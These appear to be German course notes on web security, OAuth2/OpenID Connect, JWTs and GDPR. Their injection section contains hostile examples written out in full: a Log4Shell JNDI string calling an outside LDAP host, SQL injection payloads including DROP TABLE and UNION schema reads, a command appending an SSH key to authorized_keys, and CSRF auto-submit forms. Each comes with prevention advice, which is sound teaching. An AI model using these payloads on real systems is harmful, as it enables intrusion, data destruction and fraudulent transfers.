  - Clients stecken oft zusätzliche Parameter in Redirect URIs, die von Authorization Servern dann als Problem angesehen werden
- `state` query parameter
  - kann verwendet werden, um informationen mitzugeben, die nach dem redirect wieder verwendet werden können
    - muss gegen umschreiben abgesichert werden, falls man das tut
    - macht die redirect URI lang, was ggfs zu Problemen mit Proxies führen kann
- Wenn ein Client mit verschiedenen Authorization Servern funktionieren soll, führt das zu Problemen
  - Nicht alle Authorization Server verwenden die selben Scopes, selbst wenn es um die selben daten geht

### Client Credentials Flow

- Manchmal möchte ein Client Daten von einem Resource Server holen, die nicht user-spezifisch sind
  - z.B. Statistiken, Metadaten
  - oder Client-spezifische Daten wie OAuth2-Logo oder Website URL
- Dazu gibt es den Client Credentials Flow, der keinen Resource Owner involviert

- Der Client schickt einen Access Token Request an den Token Endpoint
```
POST https://authorization-server.com/token
  grant_type=client_credentials&
  client_id=CLIENT_ID&
  client_secret=CLIENT_SECRET
```
```
POST https://authorization-server.com/token
HEADER Authorization: Basic ... (base64 clientid:clientsecret)
  grant_type=client_credentials&
```
- Der Authorization Server schickt eine Access Token Response zurück
```
{
  "access_token":"2YotnFZFEjr1zCsicMWpAA",
  "expires_in":3600
}
```

### Resource Owner Password Credentials Grant

- User können sich auch direkt per login und passwort über OAuth 2 authorisieren, um ein Access Token zu erhalten
- Das ist für Anwendungsentwicklung praktisch nie notwendig
- Sollte immer abgewiesen werden, da es notwendigerweise benötigt, dass der Client das Passwort des Users bekommt
  - User sollten nie third-party apps ihr passwort geben, daher ist dieser Grant Type für Clients meist irrelevant

### Device Authorization Grant

https://www.rfc-editor.org/rfc/rfc8628

## JSON Web Tokens

- Portables Stück Daten, das signiert wird, um die Wahrheit des Inhaltes zu garantieren
- ein JWT macht Aussagen über (meist) ein Individuum und behauptet Dinge über diese Person
- Besteht aus einem Header, einer Payload und einer Signatur

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

- Die Daten in einem JWT sind immer lesbar

### Erzeugen eines EC keypairs für unser Codebeispiel

- `openssl ecparam -genkey -name prime256v1 -noout -out ec256-ec.pem`
- `openssl pkcs8 -topk8 -in ec256-ec.pem -out ec256-priv.pem -nocrypt`
- `openssl ec -in ec256-priv.pem -pubout > ec256-pub.pem`

## OpenID Connect

- https://openid.net/specs/openid-connect-core-1_0.html
- https://openid.net/specs/openid-connect-discovery-1_0.html
- https://openid.net/specs/openid-connect-registration-1_0.html

### Was ist OpenID Connect

- Authentifizierungsframewerk
- Baut auf OAuth2 auf
- Familie von Spezifikationen

### Begriffe

- OpenID Provider bzw Identity Provider
  - erweitert den Authorization Provider aus OAuth2.0 um authentifizierung
- Relying Party
  - vergleichbar zum Client in OAuth2.0; die Anwendung, die beim Identity Provider informationen anfragt

### Der neue Authentication Flow

- Es gelten die gleichen Vorbedingungen wie in OAuth2.0
  - Client/Relying Party muss registriert werden mit Client ID, Client Secret, Redirect URIs, etc.
- Es gelten alle Schritte wie im Authorization Code Flow in OAuth2.0
- In OpenID Connect erweitert der Authorization Provider die Access Token Response
```
{
  "access_token":"2YotnFZFEjr1zCsicMWpAA",
  "expires_in":3600,
  "refresh_token":"tGzv3JOkF0XG5Qx2TlKWIA",
  "id_token": "..."
}
```
- Das `id_token` ist jetzt ein JWT, das informationen über die identität des users enthält
  - Meist alle Registered Claims enthalten (https://datatracker.ietf.org/doc/html/rfc7519#section-4.1)
  - Weitere Claims können im Identity Provider konfiguriert werden
    - z.B. in Keycloak in der Nutzerverwaltung können beliebige Claims für User hinterlegt werden, die in JWTs ausgespielt werden
- Der Client muss die Signatur des JWTs verifizieren

### Scopes

- Im Identity Provider gibt es pro user ein großes, vollständiges Datenset an Claims
- Beim Anfragen eines Identity Tokens gibt man, welche Scopes man gerne hätte
- Das Entscheidet, welches Subset an Daten in dem resultierenden JWT enthalten ist
- Man sollte eher weniger Scopes anfragen und es darauf zuschneiden, was man tatsächlich braucht
- Scope Namen hängen sehr vom Identity Provider ab und können variieren, obwohl sie die selben Daten enthalten

### JWK - JSON Web Keys bzw JSON Web Key Sets

- JWKs sind ein Austauschformat für Public Keys, die automatisiert heruntergeladen werden können zum verifizieren von Signaturen von z.B. JWTs

### OpenID Connect UserInfo Endpoint

- Benötigt ein Access Token
- Liefert rohe Userdaten aus
- Beste Option, wenn man OpenID nur zur Registration verwendet und keine Authorisierung benötigt

### Third Party Initiated Login

- Von außen auf einen Client/eine Anwendung linken und direkt einen Authentifizierungsprozess starten






# Daten Validieren

## 3 Grundpfeiler von Security

- Integrität "Das System tut das, für was es entworfen wurde"
- Vertraulichkeit "Das System gibt Daten nur an berechtigte Parteien weiter"
- Verfügbarkeit "Das System muss die Aufgaben erledigen können"


## Injections

- SQL Injections
- Cross Site Scripting
- (Buffer Overflows)
- OS Command Injection
- Path Traversal

## Log4Shell

Bug in der Library Log4j

```java
package net.codejava;
 
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.bind.annotation.RequestHeader;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
 
@RestController
public class SpringBootRESTController {

    private static final Logger logger = LogManager.getLogger("SpringBootHelloWorld");

    @RequestMapping("/")
    String home(@RequestHeader(value = "User-Agent") String userAgent) {
        logger.info("Got request from user agent: {}", userAgent);
        return "Hello World Spring Boot!";
    }

}
```

```
${java:vm}
```

```
${jndi:ldap://log4shell.huntress.com:1389/7c5dba6d-c6de-4aa1-9c1e-0f0979f86e23}
```

## Was sind Injection-Attacken?
Attacken, bei denen nutzerkontrollierter Input nicht (ausreichend) bereinigt wird und in einem Kontext verwendet wird, in dem man davon ausgeht, dass der Input sicher ist.

## Von Schwachstelle zur Attacke
Meistens braucht es eine Aneinanderreihung von Schwachstellen, um erfolgreich eine Attacke auszuführen.

## SQL-Injection
- Nutzerdaten in ein SQL-Query verpacken
- Ein Angreifer verändert Struktur bzw. Semantik der Query

- String concatenation
- Ohne Escapen
- Ohne Prepared Statements

```sql
SELECT * FROM users WHERE username = "${username}" AND password = "${password}"
```

```ts

const username = 'mgartner" --';
const password = "letmein123";
```

```sql
SELECT * FROM users WHERE username = "mgartner" --" AND password = "letmein123"
```

```ts

const username = 'mgartner"; DROP TABLE users --';
const password = "letmein123";
```

```sql
SELECT * FROM users WHERE username = "mgartner"; DROP TABLE users --" AND password = "letmein123"
```

Funktioniert nicht, JOIN muss vor WHERE stehen
```sql
SELECT * FROM products WHERE name LIKE '%' JOIN users ON 
```

```
a%' UNION SELECT 1, 1, TABLE_SCHEMA, TABLE_NAME FROM information_schema.tables; #

a%' UNION SELECT 1, TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME FROM information_schema.columns; #
```

### Generelles vorgehen
1. Herausfinden, ob die Anwendung generell anfällig für SQL-Injection ist. (z.B. indem man `'";` eingibt)
2. Herausfinden auf welchem DBMS man sich bewegt.
3. Auslesen von System-Tabellen, um Tabellennamen, Spaltennamen, usw. herauszufinden.
4. Mit dieser Information eine schädliche Abfrage konstruieren.

### Wie verhindert man SQL-Injections?
- SQL Queries sollten _niemals_ per String Building
- User(kontrollierter)-Input _immer_ bereinigen
  - Am besten nur eine kleine Menge an Inputs überhaupt erlauben
- Wenn möglich: Kein Raw-SQL als API verwenden. Stattdessen strukturierte Schnittstellen wie REST, SOAP, gRPC

### Was ist User-kontrollierter Input?
- Alles was aus Eingabemasken kommt
- Alles was über eine (öffentliche?) API kommt
- Dateien die hochgeladen werden
- Daten aus dem Filesystem
- Daten aus Datenbanken
- Protokoll-Spezifika beachten
  - HTTP-Header
































## OS Command Injection
- Kommandos werden auf Kommandozeile ausgeführt
- Durch nutzerkontrollierten Input wird die Struktur bzw. Semantik des Kommandos verändert

### Shell basics

Verkettung von Kommandos:
- `;` Ausführung hinteinander
- `&&` Ausführung bei Erfolg
- `||` Ausführung bei Fehler

`ping -c3 google.de; echo "mykey" >> ~/.ssh/authorized_keys`

### Vermeidung
- Nicht die Shell als API missbrauchen
- Input bereinigen
  - Die meisten Shells sind allerdings sehr mächtig, daher kann das schwierig sein

### Schaden verhindern
- Firewalls korrekt konfigurieren
- Sandboxing und Container
- Zugriffsrechte einschränken


## Path traversal
- Durch Nutzerkontrollierten Input wird ein Dateisystempfad manipuliert

### Vermeidung
- Niemals Pfade per String Building konstruieren
- Bereinigen des Inputs
  - z.B. `/` entfernen -> Abhängig vom OS
  - Kann schwierig werden, denn Dateisysteme können eigen sein
- Überprüfen der Dateipfade vor der Verwendung

```js
await fs.promises.readFile('public/' + fileName)
await fs.promises.readFile('public/' + '../../../')

path.resolve('public/' + '../../../') => /home/nh/code
// /home/nh/code/injections/server/public/
```

- Statt nutzerkontrollierten Input in Dateipfade zu stecken: Nutzerinput zu generierten Dateipfade zuordnen

```
Nutzer: ./Bilder/cat.jpeg
Server: hash(./Bilder/cat.jpeg) => 123323525deaf24213
        Lade /files/123323525deaf24213
```

## ReDoS
- Regex Denial of Service
- DoS: Ressourcen vergeuden bzw. blockieren, damit das System nicht mehr verfügbar i

### Funktionsweise
Um Regex auszuführen, werden NFAs (Nichtdeterministische Finite Automaten) konstruiert. Durch Eigenkanten werden die NFAs immer komplexer, so kommt es zu einer exponentiell steigenden Ausführungszeit.

![Produktionsregeln um einen NFA aus einer Regex zu erzeugen](regex_nfa_produktionsregeln.png)
![Ein NFA für einen komplexen Ausdruck](komplexer_nfa.png)

```
([a-zA-Z]+)* [a-zA-Z]*
```

### Vermeidung
- Input bereinigen
- Ausführungszeit beschränken

## Cross Site Scripting (XSS)
- Man injiziert einen (Script-) Tag?
- Man manipuliert das HTML, das an einen (anderen) Nutzer ausgeliefert wird.

- Eingabe simulieren
  - z.B. Nach Passwort fragen
- Externe Ressourcen laden
- Eingaben abfangen
- Daten extrahieren
  - per LocalStorage
  - per SessionStorage

Wir bekommen per XSS Zugriff auf den Client (Browser). Das System bzw. dessen Daten liegen aber auf dem Server.


## CSRF / Session Riding
Imitieren eines Nutzers durch Ausnutzen einer bestehenden Session, aus einem Browser heraus.

Man bringt den Browser dazu eine Anfrage an den Server zu stellen, der Browser sendet dabei das bestehende Cookie mit. Wie bringt man den Browser dazu?

![Authorisierungsablauf per Cookie](auth_schema_csrf.png)

Durch ein manipuliertes Bild

```html
<img src="https://mybank.com/transfer-funds?to=hacker&amount=10000" width="0" height="0" />
```

Durch einen speziell präparierten Link 

```html
<a href="https://mybank.com/transfer-funds?to=hacker&amount=10000">See my pictures ;-)</a>
```

Helfen dann POST requests?

### Same Origin Policy

Grundsätzlich sind Requests über Origin-Grenzen hinweg verboten.

Einschränkungen:
- GET-Requests sind grundsätzlich erlaubt
- POST-Requests
  - nur bei bestimmten Content-Types
- Per CORS (Cross Origin Resource Sharing) aufgeweichte Requests

Man ist "einigermaßen sicher" bei:
- Allem was nicht POST, GET, HEAD ist
- POST-Request mit Content-Type `application/json`


Helfen aber jetzt POST requests?

```html
<body onload="document.forms[0].submit()">
<form action="https://mybank.com/transfer-funds" method="POST">
    <input type="hidden" name="to" value="hacker"/>
    <input type="hidden" name="amount" value="10000"/>
</form>
</body>
```

### Vermeidung

- Synchronizer/CSRF-Token verwenden
    - Es wird beim Ausliefern des Frontends _auf dem Server_ ein zufälliges Token erzeugt.
    - Bei jedem weiteren Request müssen session Token und synchronizer Token zueinander passen

Ein legitimes Formular (gesendet vom legitimen Backend):

```html
<body>
<form action="https://mybank.com/transfer-funds" method="POST">
    <input type="hidden" name="to" value="hacker"/>
    <input type="hidden" name="amount" value="10000"/>
    <input type="hidden" name="csrfToken" value="t0934tu30tt33t345tg">
</form>
</body>
```

Ein nicht legitimes Formular hat keine Möglichkeit das Token zu bekommen.

```html
<body>
<form action="https://mybank.com/transfer-funds" method="POST">
    <input type="hidden" name="to" value="hacker"/>
    <input type="hidden" name="amount" value="10000"/>
    <input type="hidden" name="csrfToken" value="???">
</form>
</body>
```

badSite.html
```html
<script>
    // Funktioniert nicht aufgrund von SOP
    const response = await fetch('https://mybank.com');
    const body = await response.text();

    const csrfToken = parseFrontend(body);

    // Use CSRF token to send request
</script>
```

http://myybank.com
```html
<script>
    const response = await fetch(
        'https://mybank.com/transfer-funds',
        {
            method: 'POST',
            body: {
                to: 'hacker',
                amount: 100000
                sessionToken: sessionStorage.get('sessionToken')
            }
        }
    );
</script>
```

- CORS restriktiv konfigurieren

# DSGVO

## Grundsätze
- Rechtmäßigkeit
- Zweckbindung
- Datenminimierung
- Richtigkeit
- Speicherbegrenzung
- Integrität und Vertraulichkeit
- Rechenschaftspflicht

## Geltungsbereich
- Gilt für alle Personen, die sich innerhalb der Union _befinden_
- Unabhängig vom Sitz der verarbeitenden Stelle
- Unabhängig von der Staatsbürgerschaft
- Unabhängig davon, ob eine Diesntleistung in Anspruch genommen wird

- Gilt für Speicherung und Verarbeitung von Daten
- Die Verarbeitung kann, aber muss nicht automatisiert erfolgen

- Persönliche und familiäre Zwecke sind ausgenommen

## Was sind Personenbezogene Daten
- Die Daten müssen sich auf eine Person beziehen
- Die Person muss identifiziert oder identifizierbar sein

- Identifizierende Merkmale
  - Namen, Anschrift, usw.
  - Kennummern (Steuer ID, IBAN)
  - Standortdaten
  - Online-Kennungen (Twitter Handle, Facebook Account, usw.)
  - IP-Adressen

Wichtig: Alle Daten, die sich auf eine identifizierbare Person beziehen, sind personenbezogen, nicht nur die Merkmale, durch die die Person identifizierbar wird.

## Rechtmäßigkeit
Eines muss gegeben sein:
- Es gibt eine Einwilligung unter Angabe des Zwecks
- Die Daten sind erforderlich für eine Vertragserfüllung (auf Anfrage des Betroffenen)
- Die Datenverarbeitung ist notwendig aufgrund rechtlicher Auflagen
- Datenverarbeitung ist lebensnotwendig
- Es besteht "berechtigtes Interesse"

## Zweckbindung
- Erhebung erfolgt immer für einen Zweck
- Die Verarbeitung darf nur diesem Zweck dienen

- Zweckänderung
  - Erneute Einwilligung (unter Angabe des veränderten Zwecks)
  - Folgenabschätzung durchführen und dokumentieren
  - Ggf. Pseudonymisierung oder Verschlüsselung

## Einwilligung
- Nachweispflicht
- Eindeutig formuliert
- Freiwilligkeit: Die Einwilligung darf nicht Voraussetzung einer Vertragserfüllung oder Leistungserbringung sein, für die die Erhebung nicht erforderlich ist.

- Einwilligung erst ab 16
- Es muss eine Altersprüfung vorgenommen werden

## Besonders geschützte Daten
Dier Verarbeitung folgender Daten ist grundsätzlich untersagt:
- Ethnische Herkunft
- Politische Meinung
- Religiöse Zugehörigkeit
- Genetische Merkmale
- Biometrische Merkmale
- Gesundheitsdaten
- Daten zum Sexualleben
- Gewerkschaftszugehörigkeit

Ausnahmen:
- explizite Einwilligung (kann durch Landesrecht untersagt werden)
- Die Erhebung ist rechtlich vorgeschrieben
- Die Verarbeitung ist lebensnotwendig, und die Person ist nicht in der Lage einzuwilligen
- Die Daten wurden bereits von der betroffenen Person veröffentlicht
- Verteidigung von Rechtsansprüchen
- Die Verarbeitung wird bei berechtigtem öffentlichen Interesse per Verordnung verlangt

## Betroffenenrechte
### Informationspflicht
Erhebt man Daten, muss man aufklären über:
- Zweck der Verarbeitung
- (wenn möglich) Dauer der Speicherung
- Welche Daten erhoben werden
- Rechtsgrundlage
  - bei berechtigtem Interesse: Angabe des Grundes
- ihre Betroffenenrechte
- das Beschwerderecht
- Nennung der Auftragsverarbeiter

Bei Erhebung bei einer anderen als der betroffenen Person: https://eur-lex.europa.eu/legal-content/DE/TXT/HTML/?uri=CELEX:32016R0679&from=EN#d1e2370-1-1

### Auskunftsrecht
Jede Person kann jederzeit Auskunft darüber anfordern, ob personenbezogene (die sich auf die betroffene Person beziehen) Daten verarbeitet werden.

Werden Daten verarbeitet, dann muss Auskunft gegeben werden über:
- Zweck der Verarbeitung
- (wenn möglich) Dauer der Speicherung
- Welche Daten erhoben werden
- Rechtsgrundlage
  - bei berechtigtem Interesse: Angabe des Grundes
- ihre Betroffenenrechte
- das Beschwerderecht
- eine Kopie der Daten selbst
- Nennung der Auftragsverarbeiter


### Recht auf Berichtigung
Selbsterklärend.

### Recht auf Löschung
Betroffene Personen können die Löschung ihrer Daten fordern, falls:
- Die Daten für den Verarbeitungszweck nicht mehr erforderlich sind
- Die Einwilligung wird widerrufen und es gibt keine andere Rechtsgrundlage
- Es gibt keine Rechtsgrundlage zur Verarbeitung

Wurden die Daten an Dritte weitergegeben, muss ich diese über die Löschanfrage informieren.

### Recht auf Einschränkung der Verarbeitung
Während eine Löschanfrage geprüft wird, kann die betroffene Person fordern, dass die Daten bis zu einer Entscheidung nicht weiter verarbeitet werden.

## Pflichten der verantwortlichen Stelle
### Technische Maßnahmen
Die Vertraulichkeit und Integrität muss durch technische Maßnahmen sichergestellt werden.

Zertifizierungsverfahren können genutzt werden, sind aber nicht verpflichtend.

### Datenminimierung
Grundsätzlich sollen nur notwendige Daten erhoben werden.

Das Erheben weiterer Daten soll als opt-in Modell gestaltet werden.

### Auftragsverarbeitung
- Vor der Verarbeitung müssen vertragliche Absprachen getroffen werden, die die Einhaltung der DSGVO garantieren sollen
- Über Auftragsverarbeiter muss ein Register geführt werden
  - Zweck der Verarbeitung
  - Kategorien der verarbeiteten Darten
  - Löschfristen
  - Beschreibung der Maßnahmen, die zum Einhalt der DSGVo getroffen werden
- Die Verarbeitung erfolgt nur auf explizite schriftliche Weisung
- Der Auftragsverarbeiter muss sich für die Verwendung weiterer Verarbeiter eine Genehmigung einholen
- Nach Abschluss der Verarbeitung müssen die Daten beim Auftragsverarbeiter gelöscht werden

### Meldepflicht
Wird die Integrität oder Vertraulichkeit der Daten verletzt, muss dies unverzüglich (innerhalb von 72 Stunden) gegenüber der zuständigen Datenschutzbehörde gemeldet werden.

Die betroffenen Personen müssen unterrichtet werden.

### Folgenabschätzung
Durch die zuständige Datenschutzbehörde wird eine Liste an Verarbeitungsvorgängen veröffentlicht, die zwingend einer Folgenabschätzung bedürfen

https://www.datenschutz-bayern.de/datenschutzreform2018/DSFA_Blacklist.pdf

Eine Folgenabschätzung ist auch zu erstellen, wenn ein besonderes Risiko zu erwarten ist.

Besonderes Risiko kann bestehen bei:
- Prozessen, die Rechtswirkung auf Betroffene haben
- Besonders geschützte Daten
- Systematische Überwachung öffentlicher Bereiche

## Technische Umsetzung: Datenschutz by Design
### Grundprinzipien
- Sorgfaltspflicht
  - Erst planen, dann machen
- Datensparsamkeit
  - Nur erheben was man braucht
  - Nur so lange speichern wie nötig
  - Kontinuierliche Evaluierung des Verarbeitungszwecks
- Transparenz
  - Klar definierte Ziele
  - Klar definierte Abläufe
  - Klar definierte Verantwortliche
- Abgrenzung von Verantwortungsbereichen
  - Daten aufteilen und nur benötigte Teile übermitteln
- Bewusstsein für Möglichkeiten der Datenanalyse
  - Wann sind Daten identifizierend?
  - Was könnte man aus den Daten noch auslesen?
  - Welcher Schaden könnte entstehen, wenn die Daten veröffentlicht werden?
- Bewusstsein für IT-Sicherheit
  - Welche Maßnahmen werden momentan ergriffen?
  - Schweizer-Käse-Modell
  - Wie kann unerlaubter Zugriff festgestellt werden?
  - Regelmäßige Überprüfung der Maßnahmen (am besten durch externe Stellen)
  - Prozesse für den Notfall definieren und einüben

### Anforderungen
- Erkennbarkeit von personenbezogenen Daten
- Zuordnung von Datensätzen zu
  - betroffenen Person
  - Verarbeitungszweck
  - Rechtsgrundlage
- Möglichkeit zum Datenxport
- Möglichkeit zur Löschung
- Nachvollziehbarkeit von Zugriffen
- Möglichkeit mit pseudonymisierten oder unvollständigen Daten zu arbeiten 

## Anonymisierung
Den Personenbezug aus den Daten entfernen
- Aus einer Tabelle die entsprechende Spalte entfernen
- Daten durch zufällige Daten ersetzen
- Sollte man eine konsistente Verfremdung durchführen? (Der selben Person immer die selbe Kennung zuweisen)
  - Beugt einer statistischen Verfälschung
  - Unter Umständen wird allerdings aus der Anonymisierung nur eine Pseudonymisierung

Technische Umsetzung:
- Hashing
- Zufallsgeneratoren
- Downsampling

## Pseudonymisierung
Ersetzen von identifizierenden Merkmalen durch Pseudonyme, die originalen Daten können per Zurordnungstabelle wieder aufgelöst werden.
- Zuordnung und Daten werden getrennt gespeichert
- Umkehrbar

## Verschlüsselung
Identifizierende Daten werden per Verschlüsselung unkenntlich gemacht.
- Wiederherstellen der Daten ist nur mit dem Schlüssel möglich.
- Wird die Verschlüsselung geknackt, ist die Maßnahme wirkungslos
- Schlüssel bildet Single Point of Failure

## Eventsourcing
Grundannahme:
- Events werden auf unbestimmte Zeit gespeichert
- Events sind nach dem Speichern nicht mehr veränderbar
- Aufbau des Ist-Zustands durch Replay der Vergangenheit

Probleme:
- Speicherfristen
- Recht auf Löschung

### Ansatz: Daten verschlüsselt in den Event Store schreiben
Wie funktioniert dann das Replay, ohne dass man die Daten entschlüsselt?

Wie geht man mit alten Daten um, die man neu verschlüsseln müsste?

Ist das Löschen eines Schlüssel gleichwertig zu einer Löschung der Daten?

Wie unterscheidet man zwischen verlorenem und gelöschtem Schlüssel?

### "Compacting" / Snapshots
Den aktuellen Zustand des Systems replayen, in ein neues Event verpacken, die alten Events löschen und auf Basis des neuen Events fortfahren.

Daten löschen:
1. Ein "Tombstone"-Event in den Store schreiben, was die Daten ausnullt
2. Einen Snapshot auslösen

### Personenbezogene Daten durch Referenzen ersetzen
In den Events werden nicht die Daten direkt, sondern Verweise auf die Daten gespeichert.
Die Daten selbst liegen in einem anderen System, was die Zugriffskontrolle separat implementiert.

## Automatisierte Dependency Updates
- Per Renovatebot / Dependabot
- Der Bot erkennt package.json, pom.xml, usw.
- Der Bot stellt Pull Requests, in denen er package.json, pom.xml usw. aktualisiert
- Durch das Erstellen der PRs wird die Pipeline gestartet
- Die Pipeline kompiliert, analysiert und testet den Code mit den aktualisierten Dependency-Versionen
- Der PR kann nur gemerged werden, wenn die Pipeline erfolgreich ausführt
- In den meisten Fällen muss dann nur noch auf "merge" geklickt werden
- Voraussetzungen:
  - Gute Testabdeckung
  - Automatisierte Qualitätskontrolle per CI-Pipeline
  - (Semantic Versioning)

## Links
- [Crypto 101](https://www.crypto101.io/)

